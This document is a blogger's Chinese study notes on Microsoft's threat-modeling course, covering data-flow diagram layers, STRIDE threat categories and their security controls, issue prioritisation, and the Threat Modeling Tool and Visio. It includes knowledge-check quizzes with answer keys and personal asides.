子过程层数据流关系图子过程是第三层。 每当在创建高度敏感的系统时就应使用该层。 此层的数据流关系图包含单独的数据流关系图，这些关系图分别详细介绍每个系统子部分。 目标：表示系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。 请与你的团队核对以确认是否需要此深度级别。 何时使用子过程层将子过程层用于组织认为比较关键的系统。 系统子部分中的漏洞可能会使整个系统、客户和组织面临重大风险。 示例包括以下系统： 在安全环境中使用的系统 处理敏感数据的系统 具有高风险评分的系统 深入了解系统子部分任何需要更深入研究的系统子部分都应遵循过程层中的相同规则，并具有各自独立的数据流关系图。 通过较低级别的视图，用户可以“放大”和“缩小”系统，以展现尽可能多的上下文并达到更佳的清晰度。 方法如下： 步骤 指南 1 使用清晰的描述标签创建一个过程元素，例如“输入分析程序名称”。 2 创建一个新文件，并使用与描述标签完全相同的名称为其命名，命名采用树状结构，例如“Web 服务名称 - Web 服务工作进程名称 - 输入分析程序名称”。 3 仅将数据流关系图侧重于要“放大”的较低级别的系统子部分。 结果将得到较低级别层（称为第 3 层）中的一系列数据流关系图。 类似路径的文件命名结构有助于区分不同的级别。 第 3 层 - 较低级别层低级别层是最后一层，应在创建内核级别系统或关键级别系统时使用。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个低级别系统子部分。 目标：表示低级别系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。 请与你的团队核对以确认是否需要此深度级别。 何时使用低级别层高度关键级别系统和内核级别的系统应在此层进行威胁建模。 数据流关系图应详细描述每个子过程。 此外，通常只为一个子过程进行多轮安全检查。 按照前面各层中的步骤操作，将每个关系图追溯到各自的系统部分。 小结摘要工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。 但是，根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。 在本模块中，你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。 本模块涵盖了以下内容： 了解了数据流关系图深度层之间的差异 了解了何时使用每个层 你知道吗？ 除了这四个层之外，你还可以根据用户角色创建关系图，以帮助找出身份验证和授权方面的缺陷。 据 OWASP 等信息源的报道，这些事故是目前各个组织面临的最大安全问题，因此，根据适用的角色应用威胁模型可以增强整个系统的安全性并帮助保护客户。 知识检查 以下哪条陈述概括了在威胁建模阶段提早定义上下文深度层的重要性 A. 这样我可以收集所有使用的外部组件的详细信息。 B. 这样做可以帮助我根据要求和期望生成恰当级别的上下文。 C. 这样做有助于在进行安全评审之前找出所有相关威胁。 参考答案：== B == 解释：A. 该陈述描述了设计阶段的一部分，但未定义上下文深度层的重要性。B. 此陈述阐明了在创建数据流关系图之前设置适当上下文级别的重要性。C. 此陈述描述了中断阶段的一部分，该阶段发生在创建数据流之后。 模块4 | 处理数据流关系图关注适当的威胁模型威胁建模是一种有效的技术，可帮助你确定威胁以及找到降低风险的方法。 你可以选择重点关注发现需要保护的方面或者攻击者在系统中的行为方式。 简介重点关注重要方面关注适当的方面可以帮助你定制威胁建模练习，以得出优秀的效果。 示例包括： 设计文件共享应用程序，并专注于保护其进程、数据存储和数据流。 设计文件共享应用程序，并专注于深入了解攻击者。 包括攻击者的动机以及可能用于攻击应用程序的方式 在此模块中，你将了解执行针对系统的威胁建模练习的含义。 还会了解针对系统、资产和攻击者的方法之间的大概差异。 学习目标在本模块中，你将能够： 定义针对系统的威胁建模练习 说明针对系统、资产和攻击者的方法之间的大概差异 无必备知识即可学习 （ 威胁建模针对性方法威胁建模是一种很好的技术，可帮助你在开发生命周期的更早阶段发现问题。 选择侧重点恰当的方法有助于定制威胁建模练习。 你可以发现更多可对其执行操作的威胁和解决威胁的方法。 侧重系统的方法目的是保护整个系统。 关注每个过程、数据存储、数据流、外部实体和信任边界。 利用此信息，可用选择安全控制措施来帮助保护系统。 此框架有助于分析系统及其对其他资产的影响，具体包括： 资产类型 示例 逻辑 源代码、API 和逻辑安全控制措施 物理 服务器和物理安全控制资产 侧重攻击者的方法你可以着眼于攻击者、其动机、方法，以及他们能够在系统中造成破坏的所有方式。 这种方法关注入口点，而不是整个系统。 使用此方法，你可以专注于包含系统高度机密数据的关键资产。 重点是保护这些资产，而不是整个系统。 侧重资产的方法评估每项资产的风险。 此方法基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。 Microsoft 工程师致力于保护系统。 渗透测试团队致力于保护系统和了解攻击者。 针对系统的和其他方面的方法侧重系统的方法的重要性使用 Azure 对用户进行身份验证是很好的做法。 了解它的工作原理，了解它是如何与系统的每个部分进行交互，可以更好地避免产生实现部署后的未知风险。 毕竟，威胁建模的目标是验证之前做出的假设，确定潜在的威胁，并在开发生命周期中更早地降低风险。 侧重系统的方法的实践示例 让我们以文件共享应用程序为例。 在这种情况下，查看数据流关系图时，可能会看到以下流： 用户请求访问应用程序 身份验证流启动 用户与其他用户共享文件 此方法分析并保护每个元素， 例如用户、Web 服务、身份验证服务、数据存储、Internet 与 Azure 之间的信任边界以及数据流。 针对系统的方法包含其他一些方法，但可能需要一一试用才能获得更精细的效果。 知识检查 针对系统的方法有什么好处？ A. 使用此方法，你可以一次专注一个关键资产，以帮助确定所有潜在威胁以及降低或消除风险的方法。 B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。 C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。 针对攻击者的方法有什么好处？ A. 使用此方法，你可以一次专注一个关键资产，以识别所有潜在威胁以及降低风险的方法。 B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。 C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。 参考答案： == C == == B == 解释： A. 此条目对应于针对资产的方法。B. 此条目对应于针对攻击者的方法。C. 针对系统的方法考察整个系统，而不仅仅是其中的某些部分。 A. 此条目对应于针对资产的方法。B. 针对攻击者的方法基于攻击者及其攻击计划。C. 此条目描述针对系统的方法。 小结威胁建模是一种有效的技术，可帮助你确定威胁以及降低或消除风险的方法。 你可以侧重于发现需要保护的方面或者攻击者在系统中的行为方式。 你了解了执行针对系统的威胁建模练习的含义。 还了解了针对系统、资产和攻击者的方法之间的差异。 在本模块中，你已经学习了以下内容： 定义了针对系统的威胁建模练习 说明了针对系统、资产和攻击者的方法之间的大概差异 模块5 | 使用框架识别威胁并找到减少或消除风险的方法介绍威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除风险的方法。 你只需具备信息安全方面的应用知识，框架就可为你列出威胁的主要类别，以确保它们得到适当的处理。 何时使用框架此框架应适用于为新系统或现有系统创建的每个数据流关系图。 目的是在开发生命周期的早期尽可能多地发现并修复问题。 等待时间越长，客户的风险就越高。 预期结果框架将为你呈现六个主要威胁类别，每个类别下有无数个潜在威胁。 通过该框架，你将能够回答以下问题： 通信的双方是否都通过了身份验证？ 如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？ 每个操作是否可以绑定到标识？ 如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？ 系统中是否存在资源受限的区域？ 如何得知某人可以执行此操作？ 在本模块中，你将了解每种威胁类别及其相应的安全控制。 学习目标在本模块中，你将能够： 讨论威胁建模框架中的每个威胁类别 了解有助于降低或消除风险的安全控制 无必备知识即可学习 （ 威胁建模框架威胁建模框架查看数据流关系图中的每个元素（包括它们的交互）。 这有助于发现潜在威胁和找到降低或消除风险的方式。 威胁类别Microsoft 工程师使用 STRIDE 框架中的六个主要威胁类别来发现安全设计问题： Category 说明 欺骗 冒充某人或某物 篡改 未经授权更改数据 否认性 不宣称对执行的操作负责 信息泄露 未经许可查看数据 拒绝服务 系统繁忙 权限提升 拥有本不应该拥有的权限 安全控制类别每个威胁类别都与安全控制关联，以帮助你降低或消除风险 类别 安全控制 描述 欺骗 身份验证 其身份是否如其所述 篡改 完整性 防止恶意修改数据 否认性 不可否认性 操作与用户绑定 信息泄露 机密性 保护数据免遭意外泄露 拒绝服务 可用性 系统适当处理所有请求 特权提升 授权 用户拥有执行请求的适当权限 我们在接下来的几个单元中来了解一下各种威胁类别。 欺骗 - 冒充某人或某物当恶意人员或程序成功地冒充用户或系统进行恶意活动时，就会发生欺骗。 示例包括： 攻击者通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限 攻击者欺骗 SSID 和 IP 地址，同时使用开放且原本不安全的 TCP/IP 协议向受害者发送恶意的有效负载 可能面临欺骗攻击风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 外部实体 控制措施之外的过程、数据存储，甚至完全成熟的应用程序 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务从任务接收数据或向任务发送数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 过程 &lt;-&gt; 外部实体 一个任务向外部实体发送数据或从外部实体接收数据 如何防止欺骗攻击身份验证验证了用户和系统的身份是否属实。 示例包括： 发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性 使用 SSL/TLS 保护数据传输，以加密信息源和目标之间的流量 使用具有时效有限的令牌、密码或多重身份验证的唯一凭据来帮助保护用户、管理员和服务帐户 用于降低或消除风险的常用安全控制对于数据： 哈希 消息验证码 数字签名 对于系统： 用户身份验证 Cookie 身份验证 Kerberos SSL/TLS 证书 IPSec 数字签名的数据包 推荐问题：是否已验证通信双方的身份？ 知识检查 哪一条陈述描述了针对欺骗的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统为访问控制列表中列出的用户授予管理访问权限。 参考答案：== A == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。 篡改 - 未经授权更改数据当恶意攻击者未经授权在系统中读取、修改、删除或插入数据时，就会发生篡改。 示例包括： 修改临时存储在缓存中、通过网络发送或永久存储在数据库中的数据以破坏数据完整性 将恶意有效负载插入浏览器缓存中，以导致进程和数据存储中的行为异常 通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息 将数据重定向到被入侵的计算机以接管系统 诱使用户连接网络或下载文件，从而授予他们流量和设备访问权限（与欺骗结合使用） 可能面临篡改攻击风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 数据存储 永久或临时的数据存储 数据流 元素之间的数据移动 交互 名称 交互 定义 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 数据流 &lt;-&gt; 信任边界 通过 Internet 将数据从受信任的环境传输给某人（反之亦然） 如何防止篡改完整性防止恶意修改数据。 示例包括： 验证输入以防止处理恶意有效负载和错误处理意外行为 使用数字签名对消息进行签名，以确保消息不被篡改 使用访问控制列表应用权限 使用 SSL/TLS 保护传输 创建 IPSec 隧道，以保护终结点之间的通信 用于降低或消除风险的常用安全控制 操作系统完整性控制 访问控制列表 (ACL) 数字签名 消息验证码 推荐问题：如何得知某人无法更改传输中的数据或静态数据？ 知识检查 哪一条陈述描述了针对篡改的安全控制？ A. 发件人对电子邮件附件进行加密，以便让收件人知道电子邮件由何人所发。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统为访问控制列表中列出的用户授予管理访问权限。 参考答案：== C == 解释：A. 加密附件是不够的。 对消息进行数字签名，以确保不会发生篡改。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。 否认性 - 不宣称对执行的操作负责当有人出于恶意或无意采取某个操作，但声明其他操作时，就会发生否认性。 示例包括： 拒绝修改包含敏感操作的日志 使用其他人的帐户以避免被抓 声称没有删除数据库记录 系统日志是攻击者的金矿，不仅可用于操纵，而且可用于收集有关用户、环境和弱点的数据。 可能面临否认性攻击风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 外部实体 控制措施之外的过程、数据存储，甚至完全成熟的应用程序 数据存储 永久或临时的数据存储 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务从任务接收数据或向任务发送数据 过程 &lt;-&gt; 外部实体 一个任务向用户发送数据或从用户接收数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 如何防止否认性攻击不可否认性通过创建和保护安全日志来确保每个操作都可以追溯到其来源。 用于降低或消除风险的常用安全控制 强身份验证 安全日志记录和监视 数字签名 安全时间戳 受信任的第三方 推荐问题：是否可以将每个操作与身份绑定？ 知识检查 哪一条陈述描述了针对否认性的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统为访问控制列表中列出的用户授予管理访问权限。 参考答案：== B == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。 信息泄漏 - 查看不应查看的数据向未经授权的个人公开敏感数据时，会发生信息泄漏。 无论是在有意或无意的情况下，都有可能发生信息泄露。 示例包括： 系统通过错误消息泄露敏感数据 用户访问安全控制较弱的未授权文档和文件夹 用户访问流经非安全网络的数据 可能面临信息泄漏风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 数据存储 永久或临时的数据存储 数据流 元素之间的数据移动 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务将数据发送到另一个任务 过程 &lt;-&gt; 外部实体 一个任务向用户发送数据或从用户接收数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 数据流 &lt;-&gt; 信任边界 通过 Internet 将数据从受信任的环境传输给某人（反之亦然） 如何防止信息泄漏机密性确保数据受到保护。 示例包括： 应用访问控制列表，以确保合适的用户可以访问适当的数据 加密静态数据、传输中数据和正在使用的数据 强制实施 SSL/TLS 以保护传输 使用 IPSec 隧道保护跨终结点的通信 用于降低或消除风险的常用安全控制 加密 访问控制列表 (ACL) 推荐问题：是否可以确保没有人能查看我的传输中的数据和静态数据？ 知识检查 哪一条陈述描述了针对信息泄漏的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统为访问控制列表中列出的用户授予管理访问权限。 C. 系统记录所有操作和用户，明确每个人的责任。 参考答案：== A == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。C. 这条陈述适用于否认性。 拒绝服务 - 系统繁忙当攻击者导致系统不可用时，将发生拒绝服务。 示例包括： 向网络发送大量请求 占用内存和 CPU 进程 请求数量过多导致数据存储崩溃 可能面临拒绝服务风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 数据存储 永久或临时的数据存储 数据流 元素之间的数据移动 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务将数据发送到另一个任务 过程 &lt;-&gt; 外部实体 一个任务向用户发送数据或从用户接收数据 过程 &lt;-&gt; 数据存储 一个任务向数据存储发送数据或从数据存储接收数据 数据流 &lt;-&gt; 信任边界 通过 Internet 将数据从受信任的环境传输给某人（反之亦然） 如何防止拒绝服务可用性确保系统为用户启动且正常运行。 示例包括： 使用网络访问控制列表控制传入和传出的流量 使用弹性资源管理不断增加或减少的使用量 监视系统以检测是否出现异常 启用操作系统标志来处理内存和 CPU 进程 用于降低或消除风险的常用安全控制 访问控制列表 (ACL) 筛选 配额 授权 高可用性 推荐问题：我的服务在某些地区是否会被限制资源？ 知识检查 哪一条陈述描述了针对拒绝服务的安全控制？ A. 发送方对消息进行数字签名，以便接收方了解消息的来源。 B. 系统记录所有操作和用户，明确每个人的责任。 C. 系统依靠弹性资源来处理接收到的更多请求。 参考答案：== C == 解释：A. 此消息适用于欺骗。B. 这条陈述适用于否认性C. 这条陈述适用于拒绝服务。 权限提升 - 拥有本不应该有用的权限个人未经许可访问资源时，就会发生权限提升。 示例包括： 利用输入处理逻辑或内存中的弱点来提取数据 查找并使用特权帐户破坏服务（与欺骗和篡改威胁结合使用） 可能面临权限提升 风险的元素和交互元素 名称 形状 定义 过程 修改输入或将输入重定向到输出的活动 交互 名称 交互 定义 过程 &lt;-&gt; 过程 一个任务将数据发送到另一个任务 过程 &lt;-&gt; 外部实体 任务接收来自用户的数据 过程 &lt;-&gt; 数据存储 任务接收来自数据存储的数据 如何防止权限提升授权确保用户拥有适当的权限。 示例包括： 实现授权机制以验证对数据和资源的权限 应用安全控制，以使用最少的访问权限运行服务 监视访问以检测异常和未经授权的访问尝试。 用于降低或消除风险的常用安全控制 访问控制列表 (ACL) 基于角色的访问控制 (RBAC) 基于组的访问 权限 输入验证 推荐问题：如何得知用户可以执行此操作？ 知识检查 哪一条陈述描述了针对权限提升的安全控制？ A. 系统使用尽可能少的权限运行进程。 B. 发送方对消息进行数字签名，以便接收方了解消息的来源。 C. 系统记录所有操作和用户，明确每个人的责任。 参考答案：== A == 解释：A. 这条陈述适用于权限提升。B. 此消息适用于欺骗。C. 这条陈述适用于否认性。 小结摘要威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除系统风险的方法。 了解每种威胁类别及其相应的安全控制。 本模块涵盖了以下内容： 讨论了威胁建模框架中的每种威胁类别 了解了有助于降低或消除风险的安全控制 你知道吗？ 可以使用许多其他框架来实现不同的目标。 例如，渗透测试团队可将 LINDDUN 用于隐私威胁和攻击树。 攻击树有助于通过“假定违规”思维来确定攻击可能发生的方式。 了解详细信息 LINDDUN - 一种隐私威胁建模方法，支持分析人员系统地查找和解决软件体系结构中的隐私威胁。 网络终止链 - 介绍典型的工作流，包括攻击者用于渗入组织网络和系统的技术、策略和过程。 补上一个微软安全博客 （ https://www.microsoft.com/security/blog/ 模块6 | 设置问题的优先级并应用安全控制措施介绍威胁建模框架可以帮助你生成威胁列表和降低风险的方法，但不会为你确定其优先级。 此外，它不会基于安全控制措施的类型和功能提供分层建议，因此更难确定要实现哪些控制措施。 确实问题的优先级确定问题的优先级是威胁建模中一个重要的部分。 在资源有限的情况下，它可以帮助将资源分配给最关键的问题。 示例包括： 必须选择是要实现记录所有管理操作的功能，还是使用 SSL/TLS 对流量进行加密 确定是先实现访问控制列表，还是先增强系统的输入验证过程 何时设置优先级根据每个问题的风险因素对其指定优先级。 此外，选择可与其他措施联用的安全控制措施，可帮助为你的系统提供分层安全保护机制。 此过程可能需要一段时间才能完成。 还需要同事和安全团队的帮助。 请留出足够的时间来与其协作。 学习目标在本模块中，你将能够： 对问题分配优先级 对安全控制进行分类 了解每个安全控制措施类型和功能 无必备知识即可学习 （ 问题优先级、安全控制措施类型和功能威胁建模练习可帮助你发现一些问题，有时还会有意想不到的收获。 缺少优先级可能会让工程师感到不知所措，无法确定要首先解决哪些问题。 方法首先，确定问题对于系统的重要程度。 然后，选择有利于以最低的成本提供最大程度保护的安全控制措施。 确定安全问题的优先级根据风险严重性来确定安全问题的优先级。 各组织的标签可能不同。 但通常会根据威胁被攻击者利用时带来的风险影响，以从严重到低风险的模式设置优先级标签。 类型和功能安全控制具有不同的类型和功能。 有三个主要的类别可帮助你关注安全性的三种形式。 示例包括： 物理：摄像头、徽章和围栏 技术：加密、虚拟防火墙和防病毒软件 管理：策略、法规和书面要求 功能的意义在于针对潜在威胁每个阶段帮助保护系统。 示例包括： 用锁防止入侵 安装摄像头来检测入侵 制定入侵响应计划 修复由入侵导致的破坏 使用标志和其他安全控制措施防患于未然 在接下来的几个单元中，我们将了解优先级、类型和功能。 设置安全问题的优先级生成包含降低或消除风险的方法的威胁列表。 然后，与同事合作分配优先级。 选择优先级框架优先级练习应遵循组织创建的内部安全 bug 栏。 Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考： Microsoft 工程师使用的内部 bug 栏类似于下表，供你参考： 图标 严重性 说明 严重 可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁 重要说明 可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用 适中 可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题 低 可能会对系统用户造成轻微影响 信息 已考虑、评估潜在威胁并认为它无关紧要 知识检查 可能会对用户造成严重影响的问题通常属于哪个优先级？ A. 重要说明。 B. 严重。 C. 适中。 参考答案：== A == 解释：A. 可能会对系统用户造成严重影响。 示例包括在没有已知的解决方法时显示系统不可用。B. 可能会对系统用户造成严重影响。 示例包括涉及敏感信息泄漏的行为和需要隐私和法律参与的威胁。C. 可能对系统用户造成中等程度的影响。 示例包括存在可能的解决方法的可用性问题。 （Emmm 感觉 B 也行？ 安全控制措施类型和功能确定每个问题的优先级后，请查看安全控制措施列表，并选择对你的系统最有益的选项。 最有益的安全控制措施一般会跨多个 STRIDE 类别。 在大多数情况下，实现这些步骤的成本相对较低。 安全控制措施类型评估每项安全控制措施时，你会注意到它们属于以下类型之一： 图标 类型 说明 物理 此类控制措施从物理上阻止或检测未经授权的访问。 示例包括入口、徽章、摄像头、照明和抑制系统。 技术 此类控制措施从逻辑上保护系统。 示例包括防火墙、防病毒软件、访问控制列表和加密。 管理 此类控制措施指为系统定义流程的策略。 示例包括数据分类、审核和限制。 根据系统，你需要应用各种类型的安全控制措施，帮助建立多层保护以提升系统的安全性。 安全控制功能除了这三种主要类型外，安全控制还具有五个不同的功能，可帮助你应用多个安全层。 函数 说明 示例 预防 此策略是否有助于降低此威胁的概率或影响？ 锁定、防火墙、数据分类。 检测 此策略是否有助于识别所发生的系统攻击？ 监视、诱捕系统、审核日志。 纠正 此策略是否有助于控制如何响应传入攻击？ 物理修复、系统修补程序、事件响应计划。 恢复 此风险缓解措施是否有助于服务从攻击中恢复？ 热站点、系统备份、灾难恢复计划。 阻碍 此风险缓解措施是否有助于阻止攻击者访问系统？ 时限、最低权限、授权使用策略。 根据问题的优先级，可以考虑在系统被破坏之前、破坏过程中和破坏之后使用多项安全控制功能来保护它。 如何综合利用所有信息它们与安全控制措施类型共同形成一个矩阵，可帮助你做出正确的选择。 以下是一些示例： 功能 物理 逻辑 管理 预防 锁定 防火墙 数据分类 检测 监视 诱捕系统 审核日志 纠正 物理修复 系统修补程序 事件响应计划 恢复 热站点 系统备份 灾难恢复计划 阻碍 时限 最低权限 授权使用策略 知识检查 管理安全控制措施有什么示例？ A. 创建事件响应计划。 B. 安装新防火墙。 C. 在入口添加徽章扫描仪。 管理安全控制措施有什么示例？ A. 创建事件响应计划。 B. 安装新防火墙。 C. 在入口添加徽章扫描仪。 参考答案： == A == == C == 解释： A. 此条目适用于管理型安全控制措施。B. 此条目适用于逻辑型（可能还有物理型）安全控制措施。C. 此条目适用于物理型安全控制措施。 A. 此条目适用于预防性安全控制功能。B. 此条目适用于检测性安全控制功能。C. 此条目适用于矫正性安全控制功能。 小结威胁建模框架会为你提供威胁列表，并提供降低或消除风险的方法。 但是，它不会为你确定威胁的优先级。 此外，没有基于其类型和功能的分层安全控制建议。 你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。 在本模块中，你已经学习了以下内容： 了解了如何确定问题的优先级 分类安全控制 了解每个型安全控制措施和功能 模块7 | 使用推荐工具创建数据流图简介数据流关系图是系统工作方式的图形化表示形式。 这包括所有数据存储、进程、外部实体、信任边界和数据流。 如何创建数据流关系图你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 但是，确实需要了解威胁建模的原理，才能正确地对其进行分析。 某些应用程序提供的多种工具，它们可以通过威胁生成引擎和风险降低策略，帮助你创建数据流关系图。 其他工具仅提供创建数据流关系图的功能。 目标该学习路径的目标是让你了解威胁建模的基础知识，以便在任何地方、任何画布上进行威胁建模。 为了帮助你实现这个目标，我们会在介绍过程中推荐一些工具。 学习目标在本模块中，你将学习以下内容： 详细了解了 Threat Modeling Tool 详细了解 Visio 无必备知识即可学习 （ 建议的工具威胁建模将对你的数据流关系图应用一个框架，以帮助找到降低或消除风险的威胁和方法。 某些工具可帮助你创建数据流关系图，另一些还可以帮助你进行威胁生成练习。 根据你在威胁建模方面的专业水平，其中一些工具可能会很有帮助。 详细了解 Threat Modeling Tool在接下来的几个单元中，你将了解有关一些工具的详细信息： Threat Modeling Tool 提供多种工具，可用于创建数据流关系图并对其进行分析，以查找潜在威胁和风险降低策略 在线安装版，https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 离线安装版，https://www.microsoft.com/en-us/download/details.aspx?id=49168 （2016） 想装其他离线版本的，Guguru 一下 microsoft threat modeling tool offline installer 就好了 Visio 提供了一个干净的画布，帮助你创建数据流关系图 Visio，（要钱的 打扰了 我们将在接下来的几个单元中进行介绍。 Threat Modeling ToolMicrosoft Threat Modeling Tool 由 Microsoft 发布，并获得威胁建模社区进行认可，可以帮助工程师创建数据流关系图并将 STRIDE 应用于其威胁建模工作。 Threat Modeling Tool 提供： 可自定义的模板 威胁生成引擎，其中包含威胁和风险降低策略 默认模板称为“SDL TM 知识库”，提供一组基本元素和威胁生成功能。 只要对数据流关系图和 STRIDE 有基本的了解即可使用。 STRIDE 回顾STRIDE 是六个主要威胁类别的首字母缩写： 欺骗 - 冒充某人或某物 篡改 - 未经授权更改数据 否认性 - 不宣称对执行的操作负责 信息泄露 - 在未获得权限的情况下查看数据 拒绝服务 - 使系统过载 权限提升 - 拥有本不应拥有的权限 高级用户部分对于更高级的用户，可以在三个主要部分对模板进行自定义。 模具进程、外部实体、数据存储、数据流和信任边界构成了父元素。 你还可以创建子元素，以帮助为其他上下文、可操作的威胁生成和风险降低策略提供粒度。 子元素的工作原理示例父元素提供了选择 HTTP 和 HTTPS 子元素的选项。 HTTP 应生成更多的威胁，因为篡改、信息泄露和欺骗威胁常见于未加密通道。 使用 HTTP 使用 HTTPS 如何添加元素属性如果有必须包括在默认模板中的其他属性，可以在管理员视图中将其添加到每个元素。 当用户将该元素拖放到画布上时，将看到自己的更改。 威胁属性使用属性可以创建为每个生成的威胁填充的字段，就像使用模具属性可以为每个元素创建字段一样。 请记住：目标是以最简单的方式获得尽可能多的上下文。 威胁属性的示例管理员视图 添加可为你提供更多上下文和可操作步骤的字段。 示例包括： 问题优先级 - 了解需要首先处理哪些问题 超链接 - 将问题链接到联机文档 外部风险映射 - 通过使用可靠的第三方源（如 OWASP Top 10 和 CWE 详细信息），使用与其他组织相同的语言来描述风险 啊这，超链接和外部风险在哪 （ 用户视图 Threat Modeling Tool 用户将在分析其数据流关系图时看到这些更改。 威胁和风险降低策略这一部分是 Threat Modeling Tool 的核心。 威胁生成引擎考察独立元素和已连接的元素，以确定生成哪个威胁。 威胁生成的原理步骤 1 - 指定源和目标威胁生成引擎使用简单的句子来生成威胁。 示例包括： 目标为[元素名称] 源为[元素名称] 你还可以在标题和说明中使用元素名称。 格式为：“{target.Name}”或“{source.Name}” 步骤 2 - 合并源和目标你可以精确规定如何生成威胁。 用 AND OR 运算符组合目标、源及其各个属性。 示例包括： target.[property name] is ‘Yes’ AND source.[property name] is ‘No’ 流交叉[信任边界名称] 步骤 3 - 生成或忽略威胁威胁生成引擎使用两个字段来生成或忽略威胁： Include - 如果在此字段中添加的句子为 true，则会生成威胁 Exclude - 如果在此字段中添加的句子为 true，则不会生成威胁 下面是默认模板的实际示例，以便将这些步骤结合在一起： 威胁： 跨站点脚本 Include: (target is [Web Server]) OR (target is [Web Application]) Exclude: (target.[Sanitizes Output] is ‘Yes’) AND (target.[Sanitizes Input] is ‘Yes’) 仅在以下情况时才会生成上述跨站点脚本威胁： 进程是 Web 服务器或 Web 应用程序 未净化输入和输出 Microsoft Threat Modeling Tool 模板创建 主题很复杂，本学习路径中不会进行充分讨论。 知识检查 Threat Modeling Tool 不提供哪些优势？ A. 生成的威胁基于整个关系图，而不仅是每个元素或每次交互。 B. 可以更改威胁、模具和模具属性。 C. 生成每个威胁时，都会包含降低或消除风险的方法。 参考答案：== A == 解释：A. 该工具仅考察各个元素和各次交互。B. 可以更改字段。C. 某些模板只包含威胁，但较新版本确实包含风险降低策略。 VisioVisio 归为 Microsoft 所有，其功能强大，可帮助任何人创建优质的流程图和数据流关系图。 优点Visio 提供拖放功能和关系图批注功能。 在为系统创建关系图时，这两种功能都很有用。 缺点该应用程序不提供自动威胁建模功能。 因此，没有威胁生成引擎来帮助工程师集体讨论威胁和风险降低策略。 如果使用 Visio，你将负责对每个元素和交互进行手动威胁建模。 知识检查 Visio 不提供哪些优势？ A. 使用默认模具提供拖放功能。 B. 输出一系列生成的威胁，帮助工程师集体讨论可以如何降低或消除风险。 C. 让工程师可以为数据流图表添加批注以提供服务上下文。 参考答案：== A == 解释：A. 它确实提供拖放功能。B. Visio 没有威胁生成引擎。C. 它提供批注功能。 小结你可以使用任何画布（物理的或虚拟的）来创建数据流关系图。 Microsoft 的工程师推荐几个工具来帮助你进行威胁建模。 你了解了可用于创建数据流关系图的不同工具。 在本模块中，你已经学习了以下内容： 详细了解了 Threat Modeling Tool 详细了解了 Visio 还有很多其他工具可以帮助你解决威胁建模需求。 其中某些工具需要付费订阅才能使用，另一些则完全开放源代码。 你甚至可以使用白板，其学习难度较低，但以威胁建模专业知识为使用前提，并且难以保存。 了解详细信息Threat Modeling Toolhttps://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool Visiohttps://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software 完结撒花~ 